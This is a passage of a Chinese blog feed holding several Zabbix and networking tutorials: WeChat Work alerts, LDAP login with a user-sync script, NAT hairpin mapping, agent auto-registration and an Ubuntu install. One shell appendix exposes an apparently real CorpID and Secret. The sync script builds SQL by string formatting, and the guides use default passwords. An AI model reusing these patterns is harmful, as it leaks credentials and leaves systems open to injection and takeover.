必须修改1:企业ID</span></span><br><span class="line">corpid=<span class="string">'wwxxxxxx'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须修改2：Secret</span></span><br><span class="line">appsecret=<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxx'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须修改3:AgentId</span></span><br><span class="line">agentid=xxxxxxxxx</span><br><span class="line"><span class="comment">#获取accesstoken</span></span><br><span class="line">token_url=<span class="string">'https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid='</span> + corpid + <span class="string">'&amp;corpsecret='</span> + appsecret</span><br><span class="line">req=requests.get(token_url)</span><br><span class="line">accesstoken=req.json()[<span class="string">'access_token'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送消息</span></span><br><span class="line">msgsend_url=<span class="string">'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token='</span> + accesstoken</span><br><span class="line"></span><br><span class="line">touser=sys.argv[<span class="number">1</span>]</span><br><span class="line">subject=sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#toparty='3|4|5|6'</span></span><br><span class="line">message=sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">params=&#123;</span><br><span class="line">        <span class="string">"touser"</span>: touser,</span><br><span class="line"><span class="comment">#       "toparty": toparty,</span></span><br><span class="line">        <span class="string">"msgtype"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="string">"agentid"</span>: agentid,</span><br><span class="line">        <span class="string">"text"</span>: &#123;</span><br><span class="line">                <span class="string">"content"</span>: message</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"safe"</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req=requests.post(msgsend_url, data=json.dumps(params))</span><br><span class="line">logging.info(<span class="string">'sendto:'</span> + touser + <span class="string">';;subject:'</span> + subject + <span class="string">';;message:'</span> + message)</span><br></pre></td></tr></table></figure>

<h2 id="附录：shell脚本内容-待验证"><a href="#附录：shell脚本内容-待验证" class="headerlink" title="附录：shell脚本内容(待验证)"></a>附录：shell脚本内容(待验证)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment">#set -x</span></span><br><span class="line">CorpID=<span class="string">"wwbc27916706540977"</span>                   <span class="comment">#我的企业下面的CorpID</span></span><br><span class="line">Secret=<span class="string">"6cMYoDUUdOiLjawS487dLr4SNp1Gku_nQTq22uV9gNM"</span>            <span class="comment">#创建的应用那有Secret</span></span><br><span class="line">GURL=<span class="string">"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=<span class="variable">$CorpID</span>&amp;corpsecret=<span class="variable">$Secret</span>"</span></span><br><span class="line">Token=$(/usr/bin/curl -s -G <span class="variable">$GURL</span> |awk -F\<span class="string">": '&#123;print <span class="variable">$4</span>&#125;'|awk -F\" '&#123;print <span class="variable">$2</span>&#125;')</span></span><br><span class="line"><span class="string">#echo <span class="variable">$Token</span></span></span><br><span class="line"><span class="string">PURL="</span>https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=<span class="variable">$Token</span><span class="string">"</span></span><br><span class="line"><span class="string">function body()&#123;</span></span><br><span class="line"><span class="string">        local int agentid=1000002   #改为AgentId 在创建的应用那里看</span></span><br><span class="line"><span class="string">        local UserID=<span class="variable">$1</span>             #发送的用户位于<span class="variable">$1</span>的字符串</span></span><br><span class="line"><span class="string">        local PartyID=2           #第一步看的通讯录中的部门ID</span></span><br><span class="line"><span class="string">        local Msg=<span class="variable">$(echo "$@" | cut -d" " -f3-)</span></span></span><br><span class="line"><span class="string">        printf '&#123;\n'</span></span><br><span class="line"><span class="string">        printf '\t"</span>touser<span class="string">": "</span><span class="string">'"$UserID"\"",\n"</span></span><br><span class="line"><span class="string">        printf '</span>\t<span class="string">"toparty"</span>: <span class="string">"'"</span><span class="variable">$PartyID</span><span class="string">"\""</span>,\n<span class="string">"</span></span><br><span class="line"><span class="string">        printf '\t"</span>msgtype<span class="string">": "</span>text<span class="string">",\n'</span></span><br><span class="line"><span class="string">        printf '\t"</span>agentid<span class="string">": "</span><span class="string">'"$agentid"\"",\n"</span></span><br><span class="line"><span class="string">        printf '</span>\t<span class="string">"text"</span>: &#123;\n<span class="string">'</span></span><br><span class="line"><span class="string">        printf '</span>\t\t<span class="string">"content"</span>: <span class="string">"'"</span><span class="variable">$Msg</span><span class="string">"\""</span>\n<span class="string">"</span></span><br><span class="line"><span class="string">        printf '\t&#125;,\n'</span></span><br><span class="line"><span class="string">        printf '\t"</span>safe<span class="string">":"</span>0<span class="string">"\n'</span></span><br><span class="line"><span class="string">        printf '&#125;\n'</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/usr/bin/curl --data-ascii "</span>$(body <span class="variable">$1</span> <span class="variable">$2</span> <span class="variable">$3</span>)<span class="string">" <span class="variable">$PURL</span></span></span><br></pre></td></tr></table></figure>

<h2 id="附录：github脚本"><a href="#附录：github脚本" class="headerlink" title="附录：github脚本"></a>附录：github脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/OneOaaS/weixin-alert</span><br><span class="line">使用教程参考：https://blog.51cto.com/11975865/2344314?<span class="built_in">source</span>=dra</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix使用LDAP认证并批量导入用户</title>
    <url>/articles/970a7010.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>公司用openldap搭了一套ldap认证系统，用于统一内部各个系统的账户，避免每次添加或删除用户还得一个个登陆上去操作，使账户密码统一，能减轻很多工作和保证安全性，今天是想把ldap与zabbix进行结合。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>centos7.x</p>
<p>zabbix4.0.x</p>
<a id="more"></a>



<h2 id="配置zabbix"><a href="#配置zabbix" class="headerlink" title="配置zabbix"></a>配置zabbix</h2><h4 id="安装php-ldap模块"><a href="#安装php-ldap模块" class="headerlink" title="安装php-ldap模块"></a><strong>安装php-ldap模块</strong></h4><p>php需要这个模块来进行ldap认证，安装方法网上都有这里只列举一种；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">yum install php-ldap</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line">》/usr/<span class="built_in">local</span>/php/bin/php -m|grep ldap</span><br><span class="line">ldap</span><br></pre></td></tr></table></figure>

<h4 id="zabbix页面配置"><a href="#zabbix页面配置" class="headerlink" title="zabbix页面配置"></a><strong>zabbix页面配置</strong></h4><p><img src="/articles/970a7010/1.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LDAP host：访问ldap的地址。格式：ldap://ip地址</span><br><span class="line">Port：默认389</span><br><span class="line">Base DN: dc=tencent,dc=com,也就是域名(tencent.com)</span><br><span class="line">Search attribute: uid，属性值，网上有填sAMAccountName。</span><br><span class="line"></span><br><span class="line">Bind DN： cn=Admin, ou=People, dc=tencent, dc=com。 cn就是在DC中创建的LDAPuser用户， ou就是LDAPuser属于哪个ou，dc=tencent和dc=com不在解释。</span><br><span class="line"></span><br><span class="line">Bind password：xxxx ，改密码为LDAPuser用户的密码</span><br><span class="line">Login：Admin</span><br><span class="line">User password：在DC中创建Admin用户的密码</span><br></pre></td></tr></table></figure>

<p>点击”Test”。如果没有报什么错误，就可以点击”Save”。现在ZABBIX的LDAP认证方式就已经配置完成了。</p>
<h4 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a><strong>用户配置</strong></h4><p>上述配置完成后已经把ldap和zabbix打通了，用户登录zabbix时，会先到ldap认证，判断用户是否有效；但是zabbix不会把ldap的用户同步过了，你要登录，得先在zabbix上创建和ldap内同名的用户才行。</p>
<p><img src="/articles/970a7010/2.png" alt></p>
<p>验证登录</p>
<p><img src="/articles/970a7010/3.png" alt></p>
<h4 id="同步用户"><a href="#同步用户" class="headerlink" title="同步用户"></a>同步用户</h4><p>上面显得很被动了，于是写个脚本，定时往zabbix数据库插入用户，这样就免去手工创建的用户的烦恼。</p>
<p>先需要安装ldap客户端工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install openldap-clients</span><br></pre></td></tr></table></figure>

<p><img src="/articles/970a7010/4.png" alt></p>
<p>先查询测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -LLL -H ldap://xxxxx -b ou=People,dc=xxxxx,dc=net -D <span class="string">"cn=admin,dc=xxxxxx,dc=net"</span> -w 密码 displayName|sed <span class="string">'/^$/d'</span>|sed <span class="string">'1d'</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/970a7010/5.png" alt></p>
<p>uid是zabbix的alias字段，displayName需要base64解码成中文名</p>
<p>同步脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 避免中文乱码</span></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">ldap_list=<span class="string">'/usr/local/zabbix/sh/ldap.list'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先从ldap服务器把用户数据导入文件</span></span><br><span class="line">ldap_users=commands.getoutput(<span class="string">"ldapsearch -x -LLL -H ldap://xxxxxx -b ou=People,dc=xxxxx,dc=net -D "</span>cn=admin,dc=xxxxx,dc=net<span class="string">" -w xxxxx displayName|sed '/^$/d'|sed '1d' &gt; %s"</span> % ldap_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为zabbix的表没有自增id，所以每次操作都会记录下id，并递增</span></span><br><span class="line">idfile = <span class="string">'/usr/local/zabbix/sh/userid'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理元数据，把文件里的每行数据转化成方便使用的格式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_item</span><span class="params">(fobj)</span>:</span></span><br><span class="line">    item = [<span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>]</span><br><span class="line">    <span class="keyword">for</span> no,line <span class="keyword">in</span> enumerate(fobj):</span><br><span class="line">        <span class="comment">#print no,line</span></span><br><span class="line">        slot = no % <span class="number">2</span></span><br><span class="line">        item[slot] = line.rstrip()</span><br><span class="line">        <span class="keyword">if</span> slot == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_user</span><span class="params">()</span>:</span></span><br><span class="line">    conn = pymysql.connect(host=<span class="string">'2.2.2.2'</span>, port=<span class="number">3306</span>, user=<span class="string">'zabbix'</span>, passwd=<span class="string">'zabbix'</span>, db=<span class="string">'zabbix'</span>, charset=<span class="string">'utf8'</span>)</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    fs = open(idfile,<span class="string">'r'</span>)</span><br><span class="line">    n = int(fs.read())</span><br><span class="line">    fs.close()</span><br><span class="line">    <span class="keyword">with</span> open(ldap_list) <span class="keyword">as</span> fobj:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> get_item(fobj):</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s=<span class="string">'&#123;0&#125;&#123;1&#125;&#123;2&#125;'</span>.format(*item)</span><br><span class="line">                l = re.search(<span class="string">'uid=(.*),ou.*:: (.*)'</span>,s)</span><br><span class="line">                name = base64.b64decode(l.group(<span class="number">2</span>))</span><br><span class="line">                alias = l.group(<span class="number">1</span>)</span><br><span class="line">                search = cur.execute(<span class="string">"""select * from users where alias = %s"""</span>, (alias, ))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> search:</span><br><span class="line">                    sql = <span class="string">"insert into users(userid,name,alias) values ('%s','%s','%s');"</span> % (n,name,alias)</span><br><span class="line">                    insert = cur.execute(sql)</span><br><span class="line">                    <span class="keyword">if</span> sql:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"User %s Add Succed!"</span> % alias</span><br><span class="line">                        <span class="keyword">print</span> sql</span><br><span class="line">            <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> e</span><br><span class="line">    conn.commit()   <span class="comment">#这步很必要，不然插入的数据不生效</span></span><br><span class="line">    cur.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    fe = open(idfile,<span class="string">'w'</span>)</span><br><span class="line">    fe.write(str(n))</span><br><span class="line">    fe.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    insert_user()</span><br></pre></td></tr></table></figure>

<p>执行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python insert_sql.py</span><br></pre></td></tr></table></figure>

<p><img src="/articles/970a7010/6.png" alt></p>
<p>到页面用户中就可看到</p>
<p><img src="/articles/970a7010/7.png" alt></p>
<p>登录下，认证是成功的，接下来，你可以对用户进行分组和授权了</p>
<h2 id="LDAP挂掉后该怎么办"><a href="#LDAP挂掉后该怎么办" class="headerlink" title="LDAP挂掉后该怎么办"></a>LDAP挂掉后该怎么办</h2><p>更改认证类型为Internal，然后使用Admin登陆，如果忘记密码，也可以重置Admin密码为admin。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登录mysql，</span></span><br><span class="line"></span><br><span class="line">use zabbix;</span><br><span class="line"></span><br><span class="line">select userid,<span class="built_in">alias</span>,passwd from zabbix.users;</span><br><span class="line"></span><br><span class="line">update zabbix.users <span class="built_in">set</span> passwd=md5(<span class="string">"admin"</span>) <span class="built_in">where</span> userid=<span class="string">'1'</span>;</span><br><span class="line"></span><br><span class="line">update zabbix.config <span class="built_in">set</span> authentication_type=0;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>至此，zabbix  ldap认证教程已经全面完成。</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>Nat回环(Lan--&gt;Lan端口映射原理)</title>
    <url>/articles/6fa007b.html</url>
    <content><![CDATA[<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>局域网内网有服务器对外发布，基于对服务器的保护，内网用户需通过域名或者公网ip来访问内网服务器。如下图所示：</p>
<p> <img src="/articles/6fa007b/1.jpg" alt="img"></p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>DNAT：转换目标ip地址。</p>
<p>SNAT：转换源ip地址。</p>
<a id="more"></a>

<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>将外网202.96.128.5的80端口映射至内网192.168.2.10的80端口，外网地址对应有域名，以对外服务。同时，内网无DNS服务器，内网用户通过公网DNS解析通过同样的公网域名访问内网web服务器，要求防火墙能将内网访问该域名80端口的请求再次定向到内网服务器，使得内部访问公网域名的数据直接返回给内网服务器，以节省互联网带宽。</p>
<h2 id="数据流走向分析"><a href="#数据流走向分析" class="headerlink" title="数据流走向分析"></a>数据流走向分析</h2><p>内网服务器的真实ip和访问端口是192.168.2.10：80，要能够访问到这个服务器资源，必须需要把访问的目标ip 202.96.128.5转换成192.168.2.10，这样访问数据包才会转回内网，否则数据包交到公网上，将访问不到真实的服务器。那么需要在设备上做一次DNAT（对访问服务器的数据做目标ip的转换）。</p>
<p>如果只在设备上做一次DNAT上网转换的数据包和转发流程如下图所示:</p>
<p><img src="/articles/6fa007b/2.jpg" alt="img"></p>
<p>文中所列的数据包的结构均为：<img src="http://1874.img.pp.sohu.com.cn/images/blog/2010/7/7/16/11/12a5f3b367eg214.jpg" alt="img"></p>
<p>第一步：封装访问到目标ip为202.96.128.5的数据由客户端发出</p>
<p>第二步：在设备的LAN口接受到数据包，匹配DNAT规则，对数据包进行目标IP的转换</p>
<p>第三步：经过设备转换的数据包从lan口发出，交给局域网的真实服务器192.168.2.10.</p>
<p>第四步：服务器对访问请求做回应，它收到数据包的源ip是192.168.2.3，成为封装回应的目标ip，那么数据包有内网服务器直接发给内网主机</p>
<p>第五步：内网主机收到一个源ip为192.168.2.10的回应，和它发给目标ip为202.96.128.5的请求不一致，所以数据包直接被丢弃。在客户端看来，访问服务器失败。</p>
<p>由以上的数据包流程可以看出，要保证内网客户端能访问到服务器，只做DNAT是不够的。</p>
<p>那么需要服务器将回应数据发回给网关设备，再由网关设备转回给客户端，客户端才会接受数据。流程图应该如下图所示：</p>
<p><img src="/articles/6fa007b/3.jpg" alt="img"></p>
<p>那么要让服务器的数据发给网关，那么在服务器接收到的数据源IP是网关的IP，所以网关</p>
<p>发给服务器的数据包结构应该是：<img src="http://1874.img.pp.sohu.com.cn/images/blog/2010/7/7/16/13/12a5f3cfb78g215.jpg" alt="img"></p>
<p>这个数据包，和只做了一次DNAT从网关处发出的数据包：<img src="http://1821.img.pp.sohu.com.cn/images/blog/2012/3/20/17/10/u67435314_136eff6da7fg215.jpg" alt="img"></p>
<p>相比，源IP 做了转换。所以才需要在网关设备处再做一次SNAT。</p>
<p>如果网关要代理内网上外网的话，那么也启用了SNAT，进行私有地址到公网地址的转换。</p>
<p>所以这里的SNAT，必须要设置条件，符合条件才转换，而且要比上网的SNAT优先匹配。否则会对上网产生影响。</p>
<p>先经过网关设备DNAT处理，再经过SNAT处理的数据包走向如下图：</p>
<p><img src="/articles/6fa007b/4.jpg" alt="img"></p>
<p>由于在网关处做了DNAT和SNAT的转换，每做一次转换，设备都会记录一个链接，当服务器回应数据再经过网关时，网关会根据链接再做一次DNAT和SNAT，那么数据包发回给访问客户端的是:<img src="http://1871.img.pp.sohu.com.cn/images/blog/2012/3/20/17/11/u67435314_136eff82fa2g214.jpg" alt="img">，对于客户端来说，它之前是发给202.96.128.5的访问请求，所以会接受数据包。</p>
<p>此外对于网关设备来说，数据包是由LAN传给LAN 的，所以还需放通防火墙的LAN–LAN规则。</p>
<h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><p><strong>用户需求：</strong></p>
<p>用户内网有一台服务器：192.168.0.1，WAN1 口使用光纤接入，有公网IP 地址（202.x.x.x），该公网IP 地址对应一个域名：<a href="http://www.xxx.com，已经使用DNAT" target="_blank" rel="noopener">www.xxx.com，已经使用DNAT</a> 做端口映射把服务器发布至公网，并可以在公网访问<a href="http://www.xxx.com；现在要求在局域网（192.168.0.0/24" target="_blank" rel="noopener">www.xxx.com；现在要求在局域网（192.168.0.0/24</a> 连接在LAN 口），也可以通过访问域名：<a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> 达到访问web server：192.168.0.1，规则如下：</p>
<p>用一国内产品演示：</p>
<p>1）      做端口映射，注意外网接口选择LAN 口</p>
<p><img src="/articles/6fa007b/Nat%E5%9B%9E%E7%8E%AF-Lan-Lan%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%8E%9F%E7%90%86%5C5.jpg" alt="img"> </p>
<p>2）  做SNAT：将源地址转换成LAN 口。</p>
<p><img src="/articles/6fa007b/6.jpg" alt="img"></p>
<p>如果有Lan-Lan规则，放通规则。开放LAN1→LAN1 的防火墙规则：</p>
<p><img src="/articles/6fa007b/7.jpg" alt="img"></p>
<p>注意事项：</p>
<p>a）如果服务器在DMZ 区，则第二步可以省略，但要注意放通LAN→DMZ 的防火墙规则。</p>
<p>b）上面的方法也适用于WAN 口为ADSL 拨号使用动态域名的情况。</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix教程之自动注册</title>
    <url>/articles/276c6656.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>对于监控服务器越来越多的情况，如果还单独一个一个添加，那效率也太低，因此就要实现批量添加监控服务器的操作，Zabbix提供两种批量自动监控的方式：</p>
<p><strong>自动发现：由服务端主动发起，Zabbix Server开启发现进程，定时扫描局域网中IP服务器、设备。</strong></p>
<p><strong>自动注册：由客户端主动发起，客户端必须安装并启动Agentd，否则无法被自动注册添加至主机列表。对于使用SNMP的就要采用自动发现了。</strong></p>
<p>本篇教程就是自动注册，让客户端自动向Server去注册。</p>
<a id="more"></a>

<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><h4 id="zabbix-agent批量安装脚本"><a href="#zabbix-agent批量安装脚本" class="headerlink" title="zabbix-agent批量安装脚本"></a>zabbix-agent批量安装脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 功能：centos6.x或7.x都可以自动安装最新稳定版4.0.x agent</span></span><br><span class="line"></span><br><span class="line">vernum=`cat /etc/redhat-release|sed -r <span class="string">'s/.* ([0-9]+)\..*/\1/'</span>`</span><br><span class="line"><span class="comment"># vernum也可以这样获取： rpm -q centos-release|cut -d- -f3</span></span><br><span class="line"></span><br><span class="line">wget http://repo.zabbix.com/zabbix/4.0/rhel/<span class="variable">$&#123;vernum&#125;</span>/x86_64/zabbix-agent-4.0.9-3.el<span class="variable">$&#123;vernum&#125;</span>.x86_64.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh zabbix-agent-4.0.9-3.el<span class="variable">$&#123;vernum&#125;</span>.x86_64.rpm</span><br><span class="line"></span><br><span class="line">sed -i.ori <span class="string">'s#Server=127.0.0.1#Server=10.216.1.106#'</span> /etc/zabbix/zabbix_agentd.conf</span><br><span class="line">sed -i.ori <span class="string">'s#ServerActive=127.0.0.1#ServerActive=10.216.1.106#'</span> /etc/zabbix/zabbix_agentd.conf</span><br><span class="line">sed -i.ori <span class="string">'s#Hostname=Zabbix server#Hostname='</span>$(hostname)<span class="string">'#'</span> /etc/zabbix/zabbix_agentd.conf</span><br><span class="line">sed -i.ori <span class="string">'180a HostMetadataItem=system.uname'</span> /etc/zabbix/zabbix_agentd.conf</span><br><span class="line"></span><br><span class="line">service zabbix-agent start</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$vernum</span> == 6 ];<span class="keyword">then</span></span><br><span class="line">        chkconfig --add zabbix-agent</span><br><span class="line">        chkconfig zabbix-agent on</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        systemctl <span class="built_in">enable</span>  zabbix-agent.service</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h4 id="zabbix-server页面配置"><a href="#zabbix-server页面配置" class="headerlink" title="zabbix-server页面配置"></a>zabbix-server页面配置</h4><p>配置—-&gt;动作—–&gt;事件源选择自动注册—-&gt;创建动作</p>
<p><img src="/articles/276c6656/1.png" alt></p>
<p>触发条件</p>
<p><img src="/articles/276c6656/2.png" alt></p>
<p>我这里因为都是linux服务器，并且服务器hostname都有相同后缀，所以可以设置两个条件共同满足才可以。</p>
<p><img src="/articles/276c6656/3.png" alt></p>
<p>选择操作—-&gt;添加操作：添加主机，添加群组、链接到模板</p>
<p><img src="/articles/276c6656/4.png" alt></p>
<p>点击添加完成</p>
<p>等待几分钟 ，新的agent就会自动注册到server上了。可以查看server和agent日志查看</p>
<p><img src="/articles/276c6656/5.png" alt></p>
<p><img src="/articles/276c6656/6.png" alt></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>页面操作是主机元数据的值 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@centos ~]<span class="comment"># uname</span></span><br><span class="line">Linux</span><br></pre></td></tr></table></figure>

<p>或者是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@centos ~]<span class="comment"># zabbix_get -s 192.168.11.12 -p 10050 -k "system.uname"</span></span><br><span class="line">Linux ltt02.xxx.net 3.10.0-693.el7.x86_64 <span class="comment">#1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64</span></span><br></pre></td></tr></table></figure>

<p>获取到的就是agent配置中，把类型赋值给主机元数据，在条件中就可以设定</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HostMetadataItem=system.uname</span><br></pre></td></tr></table></figure>

<p>同理：hostname也是一样的。</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>Zabbix在Ubuntu 14.04上apt-get安装</title>
    <url>/articles/aeb6452a.html</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装Apache、Mysql、Php、zabbix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update </span><br><span class="line">sudo apt-get install apache2 mysql-server libapache2-mod-php5 php5-gd php5-mysql  php5-common zabbix-server-mysql zabbix-frontend-php</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h2><h4 id="配置数据库连接"><a href="#配置数据库连接" class="headerlink" title="配置数据库连接"></a>配置数据库连接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/zabbix/zabbix_server.conf</span><br></pre></td></tr></table></figure>

<p>修改相关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=zabbix</span><br><span class="line">#非必需，但推荐</span><br><span class="line">StartDiscoverers=5</span><br></pre></td></tr></table></figure>

<h4 id="创建mysql账号"><a href="#创建mysql账号" class="headerlink" title="创建mysql账号"></a>创建mysql账号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt; create user &apos;zabbix&apos;@&apos;localhost&apos; identified by &apos;zabbix&apos;;</span><br><span class="line">mysql&gt; create database zabbix default character set utf8;</span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to &apos;zabbix&apos;@&apos;localhost&apos;;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; exit;</span><br></pre></td></tr></table></figure>

<h4 id="导入初始化数据"><a href="#导入初始化数据" class="headerlink" title="导入初始化数据"></a>导入初始化数据</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/share/zabbix-server-mysql/</span><br><span class="line">sudo gunzip *.gz</span><br><span class="line">mysql -u zabbix -p zabbix &lt; schema.sql</span><br><span class="line">mysql -u zabbix -p zabbix &lt; images.sql</span><br><span class="line">mysql -u zabbix -p zabbix &lt; data.sql</span><br></pre></td></tr></table></figure>

<h4 id="修改-PHP-参数"><a href="#修改-PHP-参数" class="headerlink" title="修改 PHP 参数"></a>修改 PHP 参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/php5/apache2/php.ini</span><br></pre></td></tr></table></figure>

<p>修改项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post_max_size = 16M</span><br><span class="line">max_execution_time = 300</span><br><span class="line">max_input_time = 300</span><br><span class="line">date.timezone = &quot;Asia/Shanghai&quot;</span><br></pre></td></tr></table></figure>

<h4 id="配置网页"><a href="#配置网页" class="headerlink" title="配置网页"></a>配置网页</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cp /usr/share/doc/zabbix-frontend-php/examples/zabbix.conf.php.example /etc/zabbix/zabbix.conf.php</span><br><span class="line">sudo vim /etc/zabbix/zabbix.conf.php</span><br></pre></td></tr></table></figure>

<p>修改项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$DB[&apos;DATABASE&apos;] = &apos;zabbix&apos;;</span><br><span class="line">$DB[&apos;USER&apos;] = &apos;zabbix&apos;;</span><br><span class="line">$DB[&apos;PASSWORD&apos;] = &apos;zabbix&apos;</span><br></pre></td></tr></table></figure>

<p>配置apache</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cp /usr/share/doc/zabbix-frontend-php/examples/apache.conf /etc/apache2/conf-available/zabbix.conf</span><br><span class="line">sudo a2enconf zabbix.conf</span><br><span class="line">sudo a2enmod alias</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<h4 id="配置-zabbix-server-启动"><a href="#配置-zabbix-server-启动" class="headerlink" title="配置 zabbix server 启动"></a>配置 zabbix server 启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/zabbix-server</span><br></pre></td></tr></table></figure>

<p>修改项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">START=yes</span><br></pre></td></tr></table></figure>

<p>启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service zabbix-server start</span><br></pre></td></tr></table></figure>

